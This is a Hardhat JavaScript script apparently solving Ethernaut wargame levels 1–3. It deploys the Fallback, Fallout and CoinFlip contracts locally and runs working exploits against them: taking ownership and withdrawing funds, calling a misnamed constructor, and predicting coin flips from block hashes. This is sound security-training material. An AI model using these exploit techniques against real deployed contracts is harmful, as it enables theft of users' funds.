const hre = require("hardhat");

// Ethernaut Level 1
async function runLevel1() {
  const [, user] = await ethers.getSigners();
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  const fallback = await Fallback.deploy();
  await fallback.deployed();

  // Solution
  const value = ethers.utils.parseUnits("1", "gwei");
  await fallback.connect(user).contribute({value});
  await user.sendTransaction({to: fallback.address, value});
  await fallback.connect(user).withdraw();
}

// Ethernaut Level 2
async function runLevel2() {
  const [, user] = await ethers.getSigners();
  const Fallout = await hre.ethers.getContractFactory("Fallout");
  const fallout = await Fallout.deploy();
  await fallout.deployed();

  // Solution
  const value = ethers.utils.parseUnits("1", "gwei");
  await fallout.connect(user).Fal1out({value});
}

// Ethernaut Level 3
async function runLevel3() {
  const [, user] = await ethers.getSigners();
  const CoinFlip = await hre.ethers.getContractFactory("CoinFlip");
  const coinFlip = await CoinFlip.deploy();
  await coinFlip.deployed();

  // Solution
  const totalRounds = 10;
  const factor = Number("57896044618658097711785492504343953926634992332820282019728792003956564819968");
  
  for(let i = 0; i < totalRounds; i++) {
    const  lastBlock = await hre.ethers.provider.getBlock("latest");
    const flip = Math.floor(Number(lastBlock.hash)/factor);
    const side = flip === 1;

    await coinFlip.connect(user).flip(side);
  }
}


async function main() {
  // runLevel1();
  // runLevel2(); 
  runLevel3();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
